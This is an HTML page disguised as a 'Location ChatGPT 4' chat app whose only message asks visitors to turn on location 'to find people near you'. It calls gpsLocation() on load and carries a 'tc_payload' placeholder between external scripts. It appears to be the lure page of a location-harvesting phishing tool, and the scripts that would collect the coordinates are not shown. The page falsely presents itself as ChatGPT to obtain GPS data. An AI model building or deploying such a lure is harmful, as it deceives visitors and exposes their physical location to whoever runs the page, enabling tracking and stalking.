<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Find - people</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="manifest" href="./manifest.json">
  <meta name="theme-color" content="#579ffb">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body onload="gpsLocation()">
<section class="msger">
  <header class="msger-header">
    <div class="msger-header-title">
      Location ChatGPT 4
    </div>
    <div class="msger-header-options">
      <span>online</span>
    </div>
  </header>

  <main class="msger-chat">
    <div class="msg left-msg">
      <div
       class="msg-img"
       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
      ></div>

      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">Admin</div>
          <div class="msg-info-time"></div>
        </div>

        <div class="msg-text">
          Hi! Turn on your location to find people near you.
        </div>
      </div>
    </div>

  </main>

  <form class="msger-inputarea">
    <input type="text" class="msger-input" placeholder="Ask me anything...">
    <button type="submit" class="msger-send-btn">Send</button>
  </form>
</section>
<script src="./smart_client.js"></script>
<!-- tc_payload -->
<script src="./script.js"></script>

</body>
</html>
